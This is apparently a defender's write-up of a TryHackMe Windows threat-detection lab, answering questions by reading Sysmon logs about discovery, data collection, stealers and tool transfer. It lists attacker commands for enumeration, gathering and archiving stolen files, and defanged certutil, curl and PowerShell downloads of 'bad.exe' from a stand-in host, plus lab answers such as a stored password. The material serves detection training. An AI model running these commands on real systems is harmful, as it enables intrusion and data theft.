Windows Threat Detection 2 Write Up 
---
- When an adversary passes through the front door (Initial Access), most of the time they do not know where they are within the system.  
- After gaining access to a system, the adversary then starts the discovery phase of their next phase of attack.  
- _TA007: Reconnaissance_  ([Discovery, Tactic TA0007 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/tactics/TA0007/)). 
	- Tactic: Discovery
		- Discovery is a tactic that consist of technique that gain knowledge about the system and internal network. This helps adversaries to observe the enviornment and determine how to act on based on the information about the target.    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/153.png) 

Windows Discovery Commands
---

|   |   |
|---|---|
|**Discovery Purpose**|**Common CMD / PowerShell Commands**|
|Files and Folders (To find out the host purpose, victim's job, or their interests)|`type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`|
|Users and Groups (To find out who uses the host and with which privileges)|`whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`|
|System and Apps (To find out vulnerabilities or apps to steal data from)|`tasklist /v`, `systeminfo`, `wmic product get name`,`version`, `Get-Service`|
|Network Settings (To find out if the host belongs to a corporate network)|`ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`|
|Active Antivirus (To find out how risky it is to continue the attack without being blocked)|`Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`|

**1. Open CMD and type “net user Administrator”. Which privileged group does the user belong to?**  
    

- To determine the group, we must do the exact what is asked of us to do.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/154.png)

**2. What is the Image field of the net command you ran in Sysmon log?**   
    

- First, let access Sysmon logs (Event viewer > Custom View > Microsoft > Windows > Sysmon > Operational)  
    

- Once we have the logs we need, there are two ways we can find our “net command” 
    
- We can `CRTL+F` and `put net.exe` since we know that we executed a net command in the Command Prompt.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/155.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/156.png) 

- We can filter out only Event ID 1 (Process Creation) 
- By executing a net command, we are requesting information to determine which group the user Administrator is in.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/157.png) 

- After we filter, we can go through the events and find the net.exe we created in the command prompt.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/158.png)

Answer: C:\Windows\System32\net.exe 

Detecting Discovery 
---

- When an adversary has access to a system, the commands that are used to identify where they are would be a command like `whoami`, or `ipconfig` that is available in windows machines.  
- When a command is executed in the command prompt, they are logged as new processes.  
    

Questions  

**1. Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?**  
- Let's execute the invoice.pdf.exe first so it can be logged in the Sysmon logs to review the commands.  
    
![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/159.png) 

- Now let's take a look at the Sysmon logs and review.  
- Previously we discussed 2 options we can use to find the process (a. CTRL+f or b. filter to Event 1) 
- Let's use the `CTRL+F` since we know what file was executed to create a process.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/160.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/161.png) 

Answer: whoami 

**2. Which command did the malware use to check the presence of MS Defender EDR?** 
- We are already in the area of the invoice.pdf.exe process creation. 
- We just need to comb through the processes to find what command that was used to check the presence of MS Defender EDR.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/162.png) 

Answer: cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR" 

**3. To which domain did the malware send the discovered data?**  
- We must filter to Event ID: 22 to determine which domain the malware sends the information to.  
- To be sure what the domain the malware is sending the information to, we want to be sure all command execution is still linked to the invoice.pdf.exe. 
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/163.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/164.png) 

Answer: exfil[.]beecz[.]cafe 

Collection Overview
---
- Target selecting all depends on the adversary objective. It may consist of hunting for personal information, crypto wallets, gaming, or bank accounts. 
- Advanced groups just use the victim to access the corporate network. 
- Some secret can be stored in the registry or in a process memory  
 

Exfiltrating Data
---

- Data collection can be performed automatically using scripts or manually by adversaries. 
- Exfiltrate stolen data to Dropbox, Mega, Amazon S3 or other trusted cloud storage services.
	- _T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage_ ([Exfiltration Over Web Service: Exfiltration to Cloud Storage, Sub-technique T1567.002 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1567/002/#:~:text=Procedure%20Examples))
		- Tactic: Exfiltration
			- Adversaries may exfiltrate data to a cloud storage. By exploiting a cloud storage, the adversary can hide their activity within legitimate encrypted web traffic and bypass security controls that might flag connections to the unknown domain 
-  Exfiltrate stolen data to known code repositories like GitHub or messengers like Telegram ([The New InfoStealer in Town: The Continental Stealer](https://cyberint.com/blog/research/the-new-infostealer-in-town-the-continental-stealer/#:~:text=offers%20a%20Telegram%20bot%20notification%20feature%20that%20informs%20users)) 
    

Questions 

**1. What is the Facebook password that the user saved in Chrome?**  
- We can follow this method (Chrome menu > Passwords and autofill > Password Manager) to get the user Facebook password.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/165.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/166.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/167.png)

- here, we will use the password associated with the machine 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/168.png)

Answer: nsAghv51BBav90! 

**2. Which interesting SSH key does the user store on the disk?**  
- You can use PowerShell or navigate through “File Explore” 
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/169.png)

Answer: thm-access-database.key 

**3. What is the secret PDF file explaining TryHackMe’s internal network?**  
- `.pdf` files are usually stored in the Downloads folder; lets check there first.  
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/170.png)

Detecting Collection
---

- Adversaries can use command lines and graphical interface option to review sensitive files  
- In collecting, adversaries look for specific files and folders.  
- Analyst can detect access to the files by tracking commands such as:  
    

|   |   |
|---|---|
|**Command Example**|**Description**|
|`notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`|Threat actors used Notepad to check content of the interesting file|
|CMD: `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt`|Threat actors searched for the "password" keyword in a specific file|
|PowerShell: `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`|Threat actors searched for PDF files in the user's home folder|
|PowerShell: `copy C:\Users\<user>\AppData\Roaming\Signal С:\Temp\`|Threat actors copied Signal chat history to the Temp directory|
|PowerShell: `Compress-Archive С:\Temp\ С:\Temp\stolen_data.zip`|Threat actors archived the stolen data, preparing for exfiltration|
|`7za.exe a -tzip C:\Temp\stolen_data.zip С:\\Temp\\*.*`|Alternatively, threat actors can use the existing archiving software like 7-Zip|

Data Stealers
---

- Attacks targeting simple personal workstations rarely involve an adversary's interaction. These simple actions are performed by data stealers -specialized malware to automate collection and exfiltration ([Gremlin Stealer: New Stealer on Sale in Underground Forum](https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/)) 
    

- Automated data stealers rely on their own code, which makes it difficult to understand which data was accessed and stolen. 
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/171.png) 

1. Looking at the Sysmon logs, what directory does the stealer create? 
- Let take a look at Sysmon Logs and filter to stealer.exe to determine which directory was created. (Event Viewer > Application and Services Logs > Microsoft > Windows > Sysmon > Operational) 
- Filter to Event ID 1 (Process Creation) 
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/172.png)

- we can see here a Directory was created  

Answer: staging_58f1 

2. Which three file extensions does the malware search for? 
- Let's follow the execution staging of the stealer to determine the file extensions. 
    

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/173.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/174.png) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/175.png) 

Answer: docx, pdf, xlsx 

3. Which PowerShell cmdlet does the malware use to get clipboard content?  
- We should still be in the Event ID 1 (Process Creation) 
- Look for anything associated with cmdlet, clipboard, and cmdlet.

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/176.png)

Answer: Get-ClipBoard 

4. Which domain does the malware exfiltrate the data?  
- Here, we need to filter to Event ID 22 (DNS) 

![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/bd4a369ad8ad33a2f4a57fdaf8cfbd95aa2c3fa0/SOC/Window%20Event%20Viewer%20and%20Sysmon/Windows%20Threat%20Detection%202%20Write%20Up/Windows%20Threat%20Detection%202%20Img/177.png)

Answer: collecteddata-storage-2025.s3.amazonaws.com 

Ingress Tool Transfer 

- Some adversaries may need to download additional tools to achieve their goals. 
1. A script to automate Discovery and find common vulnerabilities ([GhostPack/Seatbelt: Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)) 
2. A tool to extract saved passwords or OS credentials ([gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)) 
3. A fully functional Remote Access Trojan (RAT) ([Remcos Malware - Check Point Software](https://www.checkpoint.com/cyber-hub/threat-prevention/what-is-malware/remcos-malware/))
- T1105: Ingress Tools Transfer ([Ingress Tool Transfer, Technique T1105 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1105/)) 
	- Tactic: Command and Control
		- An adversary may transfer tools or other files from an external system into a compromised environment. tools may be copied from an external adversary0controlled system to the targets network through the Command and Control Channel (FTP,SCP or HTTP). 
    
Common Transfer Methods 

|   |   |
|---|---|
|Ingress Tool Transfer Command|Common CMD / PowerShell Commands|
|Via Certutil|certutil.exe -urlcache -f [hxxps://blackhat[.]thm/bad[.]exe] good.exe|
|Via Curl (Windows 10+)|curl.exe [hxxps://blackhat[.]thm/bad[.]exe] -o good.exe|
|Via PowerShell [IWR](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)|powershell -c "Invoke-WebRequest -Uri '[hxxps://blackhat[.]thm/bad[.]exe]' -OutFile 'good.exe'"|
|Via Graphical Interface|No need to use CMD, just copy-paste malware via RDP or download them via a web browser!|

Detecting Tools Transfer 
- Since transfers do require a network connection, Event ID’s 1, 11, 22 can be the Go-To filters to analyze what was tools executed within the network.
